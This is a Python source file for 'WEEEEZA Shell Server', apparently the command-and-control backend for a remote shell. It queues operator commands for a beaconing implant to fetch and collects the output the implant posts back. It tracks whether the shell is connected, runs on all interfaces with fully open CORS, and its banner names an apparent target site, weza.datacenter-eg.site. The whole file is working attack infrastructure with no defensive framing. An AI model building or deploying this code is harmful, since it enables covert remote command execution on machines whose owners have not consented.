#!/usr/bin/env python3
"""
🔥 WEEEEZA Shell Server
Simple Python server for remote command execution
"""

import json
import os
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import urllib.parse

# Data storage
DATA_DIR = './data/'
COMMANDS_FILE = os.path.join(DATA_DIR, 'commands.json')
RESPONSES_FILE = os.path.join(DATA_DIR, 'responses.json')
STATUS_FILE = os.path.join(DATA_DIR, 'status.json')

# Create data directory
os.makedirs(DATA_DIR, exist_ok=True)

def load_json(file_path, default=None):
    """Load JSON file safely"""
    if default is None:
        default = []
    try:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(file_path, data):
    """Save JSON file"""
    try:
        with open(file_path, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except:
        return False

def update_status(connected=True):
    """Update shell status"""
    status = {
        'connected': connected,
        'last_seen': int(time.time()),
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_json(STATUS_FILE, status)

class ThreadedServer(ThreadingMixIn, HTTPServer):
    """Threaded HTTP server"""
    pass

class WeeezaHandler(BaseHTTPRequestHandler):
    """Request handler"""
    
    def do_GET(self):
        """Handle GET requests"""
        path = urllib.parse.urlparse(self.path).path
        
        if path == '/':
            self.serve_index()
        elif path == '/api/get':
            self.api_get_command()
        elif path == '/api/status':
            self.api_get_status()
        elif path.startswith('/api/response/'):
            command_id = path.split('/')[-1]
            self.api_get_response(command_id)
        else:
            self.send_error(404)
    
    def do_POST(self):
        """Handle POST requests"""
        path = urllib.parse.urlparse(self.path).path
        
        if path == '/api/send':
            self.api_send_command()
        elif path == '/api/response':
            self.api_send_response()
        else:
            self.send_error(404)
    
    def do_OPTIONS(self):
        """Handle CORS"""
        self.send_response(200)
        self.send_cors_headers()
        self.end_headers()
    
    def send_cors_headers(self):
        """Send CORS headers"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
    
    def send_json(self, data, status=200):
        """Send JSON response"""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_cors_headers()
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def get_post_data(self):
        """Get POST JSON data"""
        try:
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            return json.loads(data.decode())
        except:
            return None
    
    def serve_index(self):
        """Serve index.html"""
        try:
            with open('index.html', 'r') as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(content.encode())
        except:
            self.send_error(404, "index.html not found")
    
    def api_get_command(self):
        """Shell gets command"""
        update_status(True)
        commands = load_json(COMMANDS_FILE)
        
        if commands:
            command = commands.pop(0)
            save_json(COMMANDS_FILE, commands)
            self.send_json(command)
        else:
            self.send_json({'id': '', 'command': '', 'type': ''})
    
    def api_send_command(self):
        """Web sends command"""
        data = self.get_post_data()
        if data:
            commands = load_json(COMMANDS_FILE)
            commands.append(data)
            save_json(COMMANDS_FILE, commands)
            self.send_json({'status': 'success'})
        else:
            self.send_json({'status': 'error'}, 400)
    
    def api_send_response(self):
        """Shell sends response"""
        data = self.get_post_data()
        if data:
            if data.get('id') == 'beacon':
                update_status(True)
                self.send_json({'status': 'beacon_received'})
            else:
                responses = load_json(RESPONSES_FILE)
                responses.append(data)
                save_json(RESPONSES_FILE, responses)
                update_status(True)
                self.send_json({'status': 'response_received'})
        else:
            self.send_json({'status': 'error'}, 400)
    
    def api_get_response(self, command_id):
        """Web gets response"""
        responses = load_json(RESPONSES_FILE)
        
        for i, response in enumerate(responses):
            if response.get('id') == command_id:
                responses.pop(i)
                save_json(RESPONSES_FILE, responses)
                self.send_json(response)
                return
        
        self.send_json({'id': '', 'output': '', 'error': ''})
    
    def api_get_status(self):
        """Get connection status"""
        status = load_json(STATUS_FILE, {})
        if status:
            connected = (int(time.time()) - status.get('last_seen', 0)) < 15
            self.send_json({
                'connected': connected,
                'last_seen': status.get('timestamp', 'Never')
            })
        else:
            self.send_json({'connected': False, 'last_seen': 'Never'})
    
    def log_message(self, format, *args):
        """Custom logging"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {format % args}")

def main():
    # Initialize data files
    for file_path in [COMMANDS_FILE, RESPONSES_FILE]:
        if not os.path.exists(file_path):
            save_json(file_path, [])
    
    print("🔥 WEEEEZA Shell Server")
    print("=====================")
    print(f"🚀 Starting server...")
    print(f"📡 API endpoints:")
    print(f"   GET  /api/get - Shell gets commands")
    print(f"   POST /api/send - Web sends commands")
    print(f"   POST /api/response - Shell sends responses")
    print(f"   GET  /api/status - Check status")
    print(f"   GET  /api/response/{{id}} - Get response")
    print(f"\n🌐 Server: http://localhost:8000")
    print(f"🔥 Ready for weza.datacenter-eg.site!")
    
    try:
        server = ThreadedServer(('0.0.0.0', 8000), WeeezaHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped")

if __name__ == '__main__':
    main()